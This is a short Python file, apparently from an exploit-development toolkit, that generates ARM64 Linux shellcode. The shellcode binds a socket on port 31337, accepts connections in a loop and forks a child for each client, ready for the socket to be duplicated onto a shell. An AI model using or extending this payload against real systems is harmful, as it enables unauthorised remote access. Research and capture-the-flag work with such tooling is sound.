import socket

CLONE_CHILD_CLEARTID = 0x00200000
CLONE_CHILD_SETTID   = 0x01000000
SIGCHLD              = 17

def generate(port=31337):
    """accept loop shellcode
    
    Args:
        port(int/str): specific port

    Returns:
        ``x6`` reg indicates socket descriptor will be mapped with dup()
    """

    sc = '''
    /* socket(...) */
    mov x0, 2
    mov x1, 1
    sub x2, x2, x2
    mov x8, 198
    svc 1

    /* backup socket descriptor x6 
       bind(...)
    */
    mov x6, x0
    adr x4, sockaddr_in_1
    #mov x4, pc
    #add x4, #22
    ldr x1, [x4]
    sub x2, x2, x2
    str x1, [sp, 0]
    str x2, [sp, 4]
    mov x0, x6
    mov x1, sp
    mov x2, 16
    mov x8, 200
    svc 1

    b after_sockaddr_in_2

    /* sockaddr_in struct(...) */
sockaddr_in_1:
    .short 2
    .short %s

    /* listen(...) */
after_sockaddr_in_2:
    mov x1, 16
    mov x0, x6
    mov x8, 201
    svc 1

    /* accept(...) */
looplabel_2:
    mov x0, x6
    sub x1, x1, x1
    sub x2, x2, x2
    mov x8, 242
    svc 1

    /* fork(...) */
    /* clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f867b00d0) = 14482 */
    mov x5, x0 /* backup client socket */
    mov x0, 0x1200000
    add x0, x0, 0x11
    sub x1, x1, x1
    sub x2, x2, x2
    sub x3, x3, x3
    mov x4, sp
    mov x8, 220
    svc 1
    cmp x0, 0
    bgt cleanup_3

    /* child close(...) */
    mov x0, x6
    mov x8, 57
    svc 1

    mov x0, x5
    mov x6, x5
    b after_fork_4

    /* parent close() */
cleanup_3:
    mov x0, x5
    mov x8, 57
    svc 1

    b looplabel_2

after_fork_4:
    ''' % (socket.ntohs(port))
    return sc

if __name__ == '__main__':
    print generate()
